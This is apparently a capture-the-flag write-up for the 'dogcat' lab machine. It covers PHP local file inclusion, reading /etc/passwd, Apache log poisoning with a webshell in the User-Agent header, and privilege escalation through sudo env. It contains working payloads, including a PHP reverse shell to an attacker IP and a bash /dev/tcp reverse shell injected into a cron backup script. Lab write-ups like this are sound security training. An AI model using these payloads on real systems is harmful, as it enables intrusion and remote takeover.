@@ -1,0 +1,169 @@
+Title: dogcat
+
+I made this website for viewing cat and dog images with PHP. If you're feeling down, come look at some dogs/cats! 
+
+-Enumeration
+
+First we start with nmap scan
+
+nmap -sC -sV 10.10.118.36 
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-23 19:44 EEST
+Nmap scan report for 10.10.118.36 (10.10.118.36)
+Host is up (0.63s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
+|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
+|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-title: dogcat
+|_http-server-header: Apache/2.4.38 (Debian)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) 
+
+Open ports: 
+-22 ssh
+-80 http
+
+Nothing interesting came up, but before inspecting manually the page, we run gobuster for any interesting directories
+
+gobuster dir -u http://10.10.118.36 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+
+After giving it some time, it didn't find anything
+
+Then we visit the site and look at the source code, nothing much was found, neither /css or /js had anything interesting, having a look at the url we see that the page is running a php that shows the pictures stored in the dogs/ or cats/ folder which passes to the variable "view".
+After some basic LFI i didnt find anything until i used the php wrap filter.
+
+http://10.10.118.36/?view=php://filter/convert.base64-encode/resource=dog/../../../../../etc/passwd and an error was popped
+
+Warning: include(php://filter/convert.base64-encode/resource=dog/../../../../../etc/passwd.php): failed to open stream: operation failed in /var/www/html/index.php on line 24
+
+We use the technique to get our base64 encoded php source of dog.php and decode it to view the source
+http://10.10.118.36/?view=php://filter/convert.base64-encode/resource=dog 
+
+and we get echo PGltZyBzcmM9ImRvZ3MvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K | base64 -d => 
+<img src="dogs/<?php echo rand(1, 10); ?>.jpg" />
+
+Now we see that we can also check the source of the index.php file using directroy traversal in the same way
+
+
+http://10.10.118.36/?view=php://filter/convert.base64-encode/resource=dog../../index which gives us the source code in base64 and after decoding it we get
+
+
+<!DOCTYPE HTML>
+<html>
+
+<head>
+    <title>dogcat</title>
+    <link rel="stylesheet" type="text/css" href="/style.css">
+</head>
+
+<body>
+    <h1>dogcat</h1>
+    <i>a gallery of various dogs or cats</i>
+
+    <div>
+        <h2>What would you like to see?</h2>
+        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
+        <?php
+            function containsStr($str, $substr) {
+                return strpos($str, $substr) !== false;
+            }
+            $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
+            if(isset($_GET['view'])) {
+                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
+                    echo 'Here you go!';
+                    include $_GET['view'] . $ext;
+                } else {
+                    echo 'Sorry, only dogs or cats are allowed.';
+                }
+            }
+        ?>
+    </div>
+
+
+</body>
+
+</html>
+What’s interesting here is that it allows us to pass an “ext” variable that contains the file extension. On the variable being unset, it adds the default extension of .php
+
+so we check now if we can read the /etc/passwd with the following url:
+
+http://10.10.118.36/?view=dog../../../../../../../etc/passwd&ext=
+
+And yes we can
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+
+
+Now we check if we can find the log file where it logs all our requests. After fiddling around for a bit, we find the logs in the /var/log/apache2/access.log finding out that the server is running apache2. And we see our last request there.
+
+http://10.10.118.36/?view=dog../../../../../../../var/log/apache2/access.log&ext=
+
+
+ [23/Jul/2022:17:48:15 +0000] "GET /?view=dog/var/log/apache2/access.log&ext= HTTP/1.1" 200 707 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
+
+ We see that the log also saves our user-agent header, in our case, Mozilla Firefox
+
+ So, we check if we can inject some php code into our user-agent header that will also get executed along with the main php file.
+
+We can do this using burpsuite repeater.
+
+We try for user-agent: hello and we check the logs and it worked
+
+so we used <?php system($_GET['cmd']); ?>, a webshell like approach that will get a command passed and execute it.
+
+and with that user-agent we use:
+GET /?view=dog../../../../../../../var/log/apache2/access.log&ext=&cmd=ls and we have command execution.
+
+shell:
+
+we open a netcat listener nc -lvnp 444
+
+ php -r '$sock=fsockopen("10.4.23.126",4444);exec("/bin/sh -i <&3 >&3 2>&3");' we encode the url and via burp we send the request
+ php%20-r%20%27%24sock%3Dfsockopen%28%2210.4.23.126%22%2C4444%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
+
+ boom we have a shell and we get our first flag.
+ 
+ -Privilege escalation - Root
+ Next, we try to escalate our privilege to root. We try some enumeration and find that our user can execute /usr/bib/env as sudo using the command "sudo -l"
+ 
+ we look for priv esc at "gtfo bins"
+ we find that simple env /bin/sh gives us the shell.
+ And we have escalated to root succesfully.
+ 
+ Looking around for a bit, we find a .dockerenv file in the root directory, which tells us that we are running inside a docker container.
+ 
+ After some looking around, we find an interesting folder in the /opt/backups directory, having a look at the backup.sh file, we find the following:
+ tar cf /root/container/backup/backup.tar /root/container
+ 
+So the script basically backs up the /root/container to the backup.tar file we found. It might be running a cron job. We see that we have write permissions to the file and so, lets try writing a reverse shell into the backup.sh file.
+
+echo #!/bin/bash > backup.sh
+echo "/bin/bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1'" >> backup.sh
+
+we open up a netcat listener at port 4444 and after some time we get a shell back from root.
+ 
